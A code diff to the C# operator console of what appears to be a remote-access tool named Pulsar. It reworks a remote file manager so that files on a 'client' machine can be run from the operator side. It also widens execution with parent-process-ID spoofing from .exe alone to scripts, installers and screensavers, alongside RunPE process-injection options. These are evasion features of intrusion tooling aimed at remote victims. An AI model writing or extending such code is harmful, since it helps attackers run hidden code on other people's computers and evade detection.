@@ -238,9 +238,23 @@ namespace Pulsar.Server.Forms
             // ------------------------------------------------------
             // Check if user entered a DIRECT FILE PATH
             // ------------------------------------------------------
-            if (Path.HasExtension(newPath))
+            // -------------------------------
+            // CLEAN FILE/FOLDER DETECTION
+            // -------------------------------
+            bool isDir = Directory.Exists(newPath);
+            bool isFile = File.Exists(newPath);
+
+            // If path points to a real directory → navigate
+            if (isDir)
             {
-                // Ask to execute the file
+                _fileManagerHandler.GetDirectoryContents(newPath);
+                SetStatusMessage(this, $"Opening {newPath} ...");
+                return;
+            }
+
+            // If path points to a real file → ask to execute
+            if (isFile)
+            {
                 var result = MessageBox.Show(
                     $"Do you want to execute this file on the client?\n\n{newPath}",
                     "Execute File?",
@@ -254,8 +268,22 @@ namespace Pulsar.Server.Forms
                     SetStatusMessage(this, $"Executing {newPath}...");
                 }
 
-                return; // stop normal folder navigation logic
+                return;
             }
+
+            // ----------
+            // FALLBACKS
+            // ----------
+
+            // If path has extension but isn't a real file → treat as directory
+            if (Path.HasExtension(newPath))
+            {
+                _fileManagerHandler.GetDirectoryContents(newPath);
+                return;
+            }
+
+            // Default → treat as directory
+            _fileManagerHandler.GetDirectoryContents(newPath);
 
             // ------------------------------------------------------
             // FOLDER navigation
@@ -2602,19 +2630,27 @@ namespace Pulsar.Server.Forms
 
                 string remotePath = GetAbsolutePath(entry.Name);
 
-                // === CHECK EXTENSION FIRST ===
-                if (!remotePath.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
+                // ===== ALLOWED RUNTIME EXECUTABLES =====
+                string[] runnable =
+                {
+            ".exe", ".msi", ".bat", ".cmd",
+            ".ps1", ".vbs", ".js", ".scr", ".com"
+        };
+
+                string ext = Path.GetExtension(remotePath).ToLowerInvariant();
+
+                if (!runnable.Contains(ext))
                 {
                     MessageBox.Show(
-                        "Only .exe files can be executed using PPID spoofing.",
+                        "This file type cannot be executed using PPID spoofing.\n\nAllowed:\n.exe, .msi, .bat, .cmd, .ps1, .vbs, .js, .scr, .com",
                         "Invalid File",
                         MessageBoxButtons.OK,
                         MessageBoxIcon.Warning);
 
-                    return; // STOP completely
+                    return; // cancel entire operation
                 }
 
-                // ==== EXECUTE WITH SPECIAL FLAG ====
+                // ===== EXECUTE WITH PPID SPOOFING FLAG =====
                 _fileManagerHandler.StartProcess(
                     remotePath,
                     isUpdate: false,
@@ -2622,7 +2658,7 @@ namespace Pulsar.Server.Forms
                     useRunPE: false,
                     runPETarget: "a",
                     runPECustomPath: null,
-                    useSpecialExecution: true   // triggers PPID spoofed start
+                    useSpecialExecution: true
                 );
 
                 SetStatusMessage(this, $"Executing (PPID spoofed): {remotePath}");
